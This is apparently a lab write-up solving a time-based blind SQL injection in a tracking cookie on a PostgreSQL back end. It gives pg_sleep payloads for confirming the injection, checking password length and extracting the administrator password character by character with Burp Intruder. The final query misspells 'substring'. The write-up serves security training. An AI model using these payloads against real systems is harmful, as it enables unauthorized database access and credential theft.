
## Description:

this lab contains a blind SQL injection vulnerability, the application uses a tracking cookie for analytics and performs a query containing the value of the cookie

the results of the squery are not returned and the application does not respond any differently based on whether the query returns any rows or causes an error, but the query is executed synchronously so it is possible to trigger conditional delays to infer information

the database contains a table called 'users' with columns 'username' and 'password', you need to exploit the blind SQL injection vulnerability to find out the password of the administrator user

## Solution:

verify that the injection triggers a time delay:

	' || pg_sleep(5)-- \\ this will make the response take ~5 seconds longer

check for the username 'administrator' in the 'users' table

	'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users)--

checks the length of the administrator user password by doing a series of length checks

	'||(SELECT CASE WHEN length(password) > 19 THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- \\ the response will take ~1200ms, indicating the password is bigger than 19 characters

	'||(SELECT CASE WHEN length(password) > 20 THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- \\ the response will take ~200ms, indicating the password is not bigger than 20 characters

since we concluded it is bigger than 19 and not bigger than 20, the password must be exactly 20 characters long


construct query to verify condition based on whether or not the response takes a specific amount of time

	'|| (SELECT CASE WHEN subtring(password,$1$,1) = '$2' THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--

using Burp Intruder to configure a numeric list from 1 to 20 with step 1 in the \$1$ payload and an alphanumeric lowercase list in the \$2$ payload it is possible to exfiltrate the administrator user password